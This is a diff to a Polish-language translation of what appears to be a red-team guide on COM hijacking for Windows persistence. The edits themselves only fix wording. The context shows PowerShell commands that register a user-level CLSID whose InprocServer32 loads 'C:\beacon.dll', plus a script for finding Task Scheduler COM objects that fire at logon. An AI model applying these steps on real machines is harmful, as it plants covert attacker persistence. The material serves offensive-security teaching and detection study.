@@ -10,7 +10,7 @@ Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hij
 - gdzie _Wynik_ to **NAME NOT FOUND**.
 - i _Ścieżka_ kończy się na **InprocServer32**.
 
-Gdy zdecydujesz, który nieistniejący COM chcesz naśladować, wykonaj następujące polecenia. _Bądź ostrożny, jeśli zdecydujesz się naśladować COM, który jest ładowany co kilka sekund, ponieważ to może być przesada._
+Gdy zdecydujesz, który nieistniejący COM chcesz naśladować, wykonaj następujące polecenia. _Bądź ostrożny, jeśli zdecydujesz się naśladować COM, który jest ładowany co kilka sekund, ponieważ to może być przesadą._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -18,7 +18,7 @@ New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F
 ```
 ### Hijackowalne komponenty COM harmonogramu zadań
 
-Windows Tasks używają niestandardowych wyzwalaczy do wywoływania obiektów COM, a ponieważ są one wykonywane przez Harmonogram zadań, łatwiej jest przewidzieć, kiedy zostaną uruchomione.
+Windows Tasks używają niestandardowych wyzwalaczy do wywoływania obiektów COM, a ponieważ są one wykonywane przez Harmonogram zadań, łatwiej jest przewidzieć, kiedy będą uruchamiane.
 
 <pre class="language-powershell"><code class="lang-powershell"># Pokaż CLSID COM
 $Tasks = Get-ScheduledTask
@@ -45,13 +45,13 @@ Write-Host
 
 # Przykładowy wynik:
 <strong># Nazwa zadania:  Przykład
-</strong># Ścieżka zadania:  \Microsoft\Windows\Example\
+</strong># Ścieżka zadania:  \Microsoft\Windows\Przykład\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [więcej jak poprzedni...]</code></pre>
 
 Sprawdzając wynik, możesz wybrać jeden, który będzie wykonywany **za każdym razem, gdy użytkownik się loguje**, na przykład.
 
-Teraz szukając CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** oraz w HKLM i HKCU, zazwyczaj stwierdzisz, że wartość nie istnieje w HKCU.
+Teraz szukając CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU, zazwyczaj stwierdzisz, że wartość nie istnieje w HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
